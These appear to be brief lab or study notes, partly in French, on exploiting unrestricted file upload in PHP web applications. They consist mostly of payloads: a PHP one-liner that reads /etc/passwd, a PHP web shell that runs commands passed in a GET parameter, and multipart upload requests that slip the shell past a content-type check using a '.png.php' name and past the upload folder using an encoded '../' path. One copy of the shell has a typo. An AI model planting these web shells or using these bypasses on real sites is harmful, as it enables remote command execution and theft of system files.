## Exploit unrestricted file upload


Pour lire des fichiers en php on peux dire :
`<?php echo file_get_contents('/etc/passwd'); ?>`

Oubien pour executer des commandes a distances on peux aussi utiliser le `$_GET['0']`:

`<?php echo system(_$_GET[0]); ?>`


## Content type Bypass
``Sorry, file type text/plain is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.``

- *Bypass*: rename it into ``.png.php``

```sh
Content-Disposition: form-data; name="avatar"; filename="key.png.php"
Content-Type: image/png
<?php echo system($_GET[0]); ?>

The file avatars/key.png.php has been uploaded.<p><a href="/my-account" title="Return to previous page">
```



## Bypass using LFI

adding `../` by encoding it using url encode `..%2F`

```sh
Content-Disposition: form-data; name="avatar"; filename="..%2Fkey.php"
Content-Type: text/php

<?php phpinfo(); ?>


The file avatars/../key.php has been uploaded.<p>
```

Now visit the url but ``../``